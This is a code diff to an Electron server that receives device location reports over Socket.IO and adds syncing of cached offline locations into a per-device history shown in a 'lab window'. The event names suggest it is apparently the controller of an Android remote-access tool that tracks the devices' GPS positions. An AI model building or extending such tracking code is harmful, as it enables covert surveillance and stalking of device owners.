@@ -234,12 +234,14 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
     // Xử lý location data từ client
     socket.on('x0000lm', function (data) {
       if (data && data.enable && data.lat !== 0 && data.lng !== 0) {
-        // Lưu location vào history
+        // Lưu location vào history với nhãn online
         deviceManager.addLocationToHistory(index, {
           lat: data.lat,
           lng: data.lng,
           accuracy: data.accuracy || null,
-          address: data.address || null
+          address: data.address || null,
+          isOffline: false,
+          timestamp: Date.now()
         });
 
         // Gửi thông báo đến lab window nếu đang mở
@@ -250,6 +252,50 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
             history: deviceManager.getLocationHistory(index)
           });
         }
+      }
+    });
+
+    // Xử lý sync offline locations từ client
+    socket.on('x0000syncOfflineLocations', function (data) {
+      if (data && data.locations && data.locations.length > 0) {
+        console.log(`[+] Syncing ${data.locations.length} offline locations for device: ${index}`);
+
+        // Lưu từng location vào history
+        data.locations.forEach(location => {
+          if (location.lat !== 0 && location.lng !== 0) {
+            deviceManager.addLocationToHistory(index, {
+              lat: location.lat,
+              lng: location.lng,
+              accuracy: location.accuracy || null,
+              address: location.address || null,
+              timestamp: location.timestamp || Date.now(),
+              isOffline: true
+            });
+          }
+        });
+
+        // Gửi thông báo đến lab window nếu đang mở
+        if (windows[index]) {
+          BrowserWindow.fromId(windows[index]).webContents.send('SocketIO:OfflineLocationsSynced', {
+            deviceId: index,
+            count: data.locations.length,
+            history: deviceManager.getLocationHistory(index)
+          });
+        }
+
+        // Gửi response về client để xác nhận sync thành công
+        socket.emit('x0000syncOfflineLocationsResponse', {
+          status: true,
+          message: `Successfully synced ${data.locations.length} offline locations`,
+          count: data.locations.length
+        });
+      } else {
+        // Gửi response về client
+        socket.emit('x0000syncOfflineLocationsResponse', {
+          status: true,
+          message: 'No offline locations to sync',
+          count: 0
+        });
       }
     });
 
